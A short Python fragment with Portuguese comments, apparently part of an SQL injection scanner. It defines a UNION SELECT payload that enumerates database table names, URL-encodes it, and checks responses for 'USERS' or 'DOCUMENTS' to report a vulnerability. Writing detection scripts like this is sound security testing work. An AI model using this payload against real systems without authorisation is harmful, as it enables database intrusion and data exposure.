var_sql = ''' UNION SELECT TABLE_NAME, NULL, NULL FROM INFORMATION_SCHEMA.TABLES--''' 

def codificar_url(sql):
  """Codifica a string SQL para formato URL."""
  return urllib.parse.quote(sql, safe='')

def analisar_resposta_busca(response_json):
  """Analisa o JSON de resposta da busca por 'USERS' ou 'DOCUMENTS' e emite mensagem se a vulnerabilidade for detectada."""
  for item in response_json:
    if 'USERS' in item or 'DOCUMENTS' in item:
      print('Vulnerabilidade de Injeção SQL detetada no parâmetro de busca.')
